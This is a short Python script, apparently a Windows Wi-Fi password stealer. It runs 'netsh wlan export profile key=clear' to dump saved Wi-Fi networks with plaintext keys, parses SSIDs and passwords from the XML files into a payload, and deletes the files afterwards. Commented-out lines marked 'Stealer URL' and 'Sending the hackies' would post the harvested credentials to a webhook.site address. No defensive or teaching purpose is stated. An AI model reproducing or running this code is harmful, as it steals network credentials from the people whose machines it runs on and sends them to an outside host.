import subprocess
import os
#import requests
import xml.etree.ElementTree as ET



# Stealer URL
#url = requests.get("https://webhook.site/10866c5e-f97f-45b7-97a8-65d03e82b460")


#create a file
# password_file = open("wifi_passds.txt", "w")
# password_file.write("Here are your passwords: \n\n")
# password_file.close()

#lists & Dictionaries
wifi_file=[]
payload = {"SSID":[], "Password":[]}
# wifi_name=[]
# wifi_password=[]


# Use Python to execute a windows command
command = subprocess.run(["netsh", "wlan", "export","profile", "key=clear"], capture_output=True).stdout.decode()

#Grab the current directory
path = os.getcwd()

#Do the hackies
# Append Wif-Fi xml files to the wifi_files list
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi-") and filename.endswith(".xml"):
        wifi_file.append(filename)
        
        
#   Parsing Wi-Fi XML file to Wi-Fi files list
for file in wifi_file:
    tree = ET.parse(file)
    root = tree.getroot()
    SSID = root[0].text
    Password = root[4][0][1][2].text
    payload["SSID"].append(SSID)
    payload["Password"].append(Password)
    os.remove(file)
    
       
# #Sending the hackies
#payload_str = " & ".join("%s=%s" % (k,v) for k,v in payload.items())
#url = requests.post(url, params='format=json', data=payload_str)
    
